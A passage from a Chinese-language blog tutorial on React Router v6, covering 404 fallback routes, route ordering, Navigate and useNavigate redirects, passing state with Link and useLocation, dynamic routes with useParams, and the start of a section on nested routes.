class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Error</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />当点击“<strong>产品</strong>”时，就会加载 <code>Product</code> 组件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978894343-fcd3ca1b-eabd-40c2-91a7-7ef0056fac6e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978894343-fcd3ca1b-eabd-40c2-91a7-7ef0056fac6e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当点击“<strong>首页</strong>”时，就会加载 <code>Home</code> 组件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978932164-2e7f71dd-4b10-46ec-9cf6-add3e2fe9ff5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978932164-2e7f71dd-4b10-46ec-9cf6-add3e2fe9ff5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当在地址栏输入一个没有定义的路由时，就会加载 <code>Error</code> 组件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978990607-2499d9bd-77cc-43fd-99a8-8c5855576a8e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662978990607-2499d9bd-77cc-43fd-99a8-8c5855576a8e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>从上面的代码中可以看到，如果想要在所有 <code>Route</code> 都不匹配时就渲染 <code>404</code> 页面，只需将 <code>404</code> 页面对应的 <code>Route</code> 的 <code>path</code> 设置为 <code>*</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Routes</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Error</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">&lt;/<span class="title class_">Routes</span>&gt;</span><br></pre></td></tr></table></figure><p><a name="AWxt8"></a></p><h3 id="（5）路由顺序"><a href="#（5）路由顺序" class="headerlink" title="（5）路由顺序"></a>（5）路由顺序</h3><p>在 React Router <strong>v6</strong> 以前，我们必须按照一定的顺序来定义路由，以获得准确的渲染。在 <strong>v6</strong> 及之后的版本中，路由定义的顺序无关紧要。</p><p>以下代码在 <strong>v5</strong> 中，<code>/product/new</code>将匹配到第一个路由并渲染 <code>Product</code> 组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product/:id&quot;</span> <span class="attr">component</span>=<span class="string">&#123;Product&#125;</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product/new&quot;</span> <span class="attr">component</span>=<span class="string">&#123;NewProduct&#125;</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Switch</span>&gt;</span><br></pre></td></tr></table></figure><p><br />而在 <strong>v6</strong> 中，将 <code>&lt;Switch&gt;</code> 组件替换为了 <code>&lt;Routes&gt;</code> 组件。<code>/products/new</code>将匹配这两个路由，但只会渲染<code>NewProduct</code>组件，因为它是更具体的匹配：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Routes</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product/:id&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product/new&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">NewProduct</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">&lt;/<span class="title class_">Routes</span>&gt;</span><br></pre></td></tr></table></figure><p><a name="zmIEX"></a></p><h2 id="3-编程式导航"><a href="#3-编程式导航" class="headerlink" title="3. 编程式导航"></a>3. 编程式导航</h2><p>React Router 提供了两种不同的编程式导航方式：<br />● <strong>声明式导航组件</strong>：<code>&lt;Navigate&gt;</code>组件<br />● <strong>命令式导航方法</strong>：<code>useNavigateHook</code></p><p>我们可以使用这两种编程的方式来跳转到指定的路由，也可以实现路由的重定向，比如在浏览器的地址栏输入一个 URL 并进行跳转时，如果应用中没有定义该路由，就跳转到应用的首页。</p><p><a name="jPHC1"></a></p><h3 id="（1）Navigate"><a href="#（1）Navigate" class="headerlink" title="（1）Navigate"></a>（1）Navigate</h3><p><code>&lt;Navigate&gt;</code>组件是一种声明式的导航方式。使用 <code>Navigate</code> 组件时，首先需要从 <code>react-router-dom</code> 导入 <code>Navigate</code> 组件。然后在 <code>Navigate</code> 组件中通过 <code>to props</code> 来指定要跳转的路径：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span>, <span class="title class_">Navigate</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&quot;./About&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&quot;./Home&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Navigate</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样，当在浏览器地址栏输入一个未定义的路由时，就会要转到首页。</p><p><a name="ROV7Y"></a></p><h3 id="（2）useNavigate"><a href="#（2）useNavigate" class="headerlink" title="（2）useNavigate"></a>（2）useNavigate</h3><p><code>useNavigate Hook</code>是一种命令式导航方式。使用这个 <code>Hook</code> 时，首先需要从 <code>react-router-dom</code> 中导入 <code>useNavigate</code>，然后传递给它需要跳转的路由即可。假如在提交完表单之后，跳转到主页，可以这样实现：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useNavigate &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function Register () &#123;</span></span><br><span class="line"><span class="string">  const navigate = useNavigate()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  return (</span></span><br><span class="line"><span class="string">    &lt;div&gt;</span></span><br><span class="line"><span class="string">      &lt;Form afterSubmit=&#123;() =&gt; navigate(&#x27;</span>/<span class="string">&#x27;)&#125; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  )</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><a name="xXXEy"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a name="yuLPm"></a></p><h2 id="4-通过路由传递状态"><a href="#4-通过路由传递状态" class="headerlink" title="4. 通过路由传递状态"></a>4. 通过路由传递状态</h2><p>在 <code>react-router-dom</code> 中可以通过以下三种方式来传递状态：<br />● 使用 <code>Link</code> 组件<br />● 使用 <code>Navigate</code> 组件 <br />● 使用 <code>useNavigate</code> 钩子</p><p><a name="AiKbq"></a></p><h3 id="（1）Link"><a href="#（1）Link" class="headerlink" title="（1）Link"></a>（1）Link</h3><p>下面来使用 <code>Link</code> 组件通过 <code>state props</code> 来将数据从产品页面传递到主页：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Contact</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span>产品页面<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> <span class="attr">state</span>=<span class="string">&#123;</span>&quot;<span class="attr">From</span> <span class="attr">Product</span>&quot;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        返回</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Contact</span>;</span><br></pre></td></tr></table></figure><p><br />现在我们就将需要的数据传递出来了，那该如何在首页获取从产品页面传递出来的数据呢？可以在接收信息的页面（首页）中使用一个名为 <code>useLocation</code> 的钩子来获取数据：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useLocation &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Settings</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> location = <span class="title function_">useLocation</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;location.state&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />当在产品页面点击返回时，就会跳转到首页，并且首页显示了从产品页面传递出来的数据：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662981815099-b054778f-0274-48db-badd-b90fe4c06fc3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662981815099-b054778f-0274-48db-badd-b90fe4c06fc3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="HvMYD"></a></p><h3 id="（2）Navigate"><a href="#（2）Navigate" class="headerlink" title="（2）Navigate"></a>（2）Navigate</h3><p><code>Navigate</code>组件也可以在 <code>react-router-dom</code> 中传递状态，其使用方式和 <code>Link</code> 组件类似。假如当点击关于按钮时，跳转到首页，并告诉首页该跳转是从哪个页面来的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Route</span> path=<span class="string">&quot;/about&quot;</span> element=&#123;<span class="language-xml"><span class="tag">&lt;<span class="name">Navigate</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> <span class="attr">state</span>=<span class="string">&#123;</span>&quot;<span class="attr">From</span> <span class="attr">About</span>&quot;&#125; /&gt;</span></span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p><br />在首页中仍然是使用 <code>useLocation</code> 钩子来获取状态值：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useLocation &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Settings</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> location = <span class="title function_">useLocation</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;location.state&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />当在首页点击“<strong>关于</strong>”时，就会重定向到首页，并且首页中会显示 <code>From About</code>：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662982410831-da070bee-f35e-4e5c-9e17-916ccea8db11.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662982410831-da070bee-f35e-4e5c-9e17-916ccea8db11.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="emCx8"></a></p><h3 id="（3）useNavigate"><a href="#（3）useNavigate" class="headerlink" title="（3）useNavigate"></a>（3）useNavigate</h3><p>上面我们介绍了如何使用 useNavigate 钩子来进行重定向，在调用 navigate() 函数时，给它传递了一个参数，即要重定向的路径。实际上，navigate() 函数接受两个参数，第一个参数就是跳转的路径，第二个参数是包含状态的对象。可以借助 useNavigate Hook 来实现状态传递：<br />在首页中仍然是使用 useLocation 钩子来获取状态值，和上面两种方式一样，这里不再多介绍。</p><p><a name="bm0vK"></a></p><h2 id="5-动态路由"><a href="#5-动态路由" class="headerlink" title="5. 动态路由"></a>5. 动态路由</h2><p>一个很常见的场景，在维基百科进行搜索时，URL 的模式始终是一样的，如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//zh.wikipedia.org/wiki/&#123;keyword&#125;</span></span><br></pre></td></tr></table></figure><p><br />这里的 <code>keyword</code> 就是我们在维基百科中搜索的内容，这个内容是不固定的，并且有很多很多，我们不可能为每个关键词都创建一个路由。其实，只需要声明一个带有 <code>keyword</code> 占位符的路由即可。对于上面的例子，只需要将 <code>Route</code> 组件的 <code>path props</code> 声明为这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Route</span> path=<span class="string">&quot;/wiki/:keyword&quot;</span> element=&#123;<span class="language-xml"><span class="tag">&lt;<span class="name">Wiki</span> /&gt;</span></span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p>这时，无论是访问<code>/wiki/javascript</code>还是<code>/wiki/react</code>，都会加载 <code>Wiki</code> 组件。</p><p>那我们该如何在组件中访问 URL 中的动态部分呢？从 <strong>v5.1</strong> 开始，React Router 就提供了一个 <code>useParams Hook</code>，它返回一个对象，该对象具有 URL 参数及其值之间的映射。使用方式如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useParams &#125; <span class="keyword">from</span> <span class="string">&quot;react-router&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Wiki</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; keyword &#125; = <span class="title function_">useParams</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;keyword&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，通过获取到的 URL 参数，就可以请求页面对应的数据。</p><p><a name="mkFiL"></a></p><h2 id="6-嵌套路由"><a href="#6-嵌套路由" class="headerlink" title="6. 嵌套路由"></a>6. 嵌套路由</h2><p>嵌套路由允许父路由充当包装器并控制子路由的渲染。<br />比如，在应用中点击消息时，会跳转到 <code>/messages</code> 路由，并显示所有的通知列表。当点击某一条消息时，就会跳转到 <code>/messages/:id</code> 路由，这时就能看到指定 <code>id</code> 的消息详情，同时消息列表是显示在左侧的。这个场景就要依赖嵌套路由来实现。下面来看看如何使用 React Router 实现这种嵌套路由模式。</p><p>从最基础的结构开始定义：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/messages&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Messages</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/settings&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Settings</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />现在，我们希望 <code>Messages</code> 能够控制渲染子路由，那能不能直接在 <code>Messages</code> 组件中来定义子路由呢？就像这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Messages</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Conversations</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;:id&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">MessagesDetails</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />现在，当用户导航到 <code>/messages</code> 时， React Router 会呈现 <code>Messages</code> 组件。<code>Messages</code> 组件中通过 <code>Conversations</code> 组件来显示消息列表，然后使用将 <code>/messages/:id</code> 映射到 <code>Chat</code> 组件的 <code>Route</code> 来渲染另一个 <code>Routes</code>。</p><blockquote><p>注意：这里不必在嵌套路由中包含完整的 &#x2F;messages&#x2F;:id 路径，因为 Routes 是很智能的，当省略了前导 &#x2F;，就会认为这条路径是相对于父级 &#x2F;messages 的。</p></blockquote><p><br />这样，只有在跳转到<code>/Messages</code>时才会渲染消息列表。当访问与<code> /messages/:id</code> 模式匹配的路由时，消息列表就消失了，嵌套路由永远不被会渲染。</p><p>为了解决这个问题，我们需要告诉 React Router 想要在路由为 <code>/messages</code> 时或者为任何其他匹配 <code>/messages/* </code>模式的路由时要渲染消息列表。</p><p>那如果只是将路径修改为 <code>/messages/*</code>会怎样呢？</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 